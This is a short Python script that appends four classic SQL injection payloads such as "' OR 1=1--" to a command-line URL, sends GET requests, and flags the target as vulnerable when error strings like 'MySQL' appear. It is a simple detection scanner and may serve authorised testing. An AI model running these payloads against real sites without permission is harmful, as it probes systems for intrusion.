import requests
import sys

def test_sql_injection(url):
    # List of common SQL injection payloads
    sql_payloads = ["' OR 1=1--", "' OR '1'='1", "' OR ''='", "' OR 1=1-- -"]

    for payload in sql_payloads:
        # Inject the payload into the URL
        injected_url = url + payload

        try:
            # Make an HTTP request to the injected URL
            response = requests.get(injected_url)

            # Check if the response contains any SQL errors or vulnerabilities
            if "SQL syntax" in response.text or "MySQL" in response.text:
                print(f"Vulnerable to SQL injection with payload: {payload}")
                return

        except requests.exceptions.RequestException as e:
            print(f"Error occurred while testing {injected_url}: {str(e)}")

    print("Not vulnerable to SQL injection")

# Check if a URL is provided as an argument
if len(sys.argv) < 2:
    print("Usage: python script.py <url>")
    sys.exit(1)

# Get the URL from the command-line argument
url = sys.argv[1]

# Test the URL for SQL injection
test_sql_injection(url)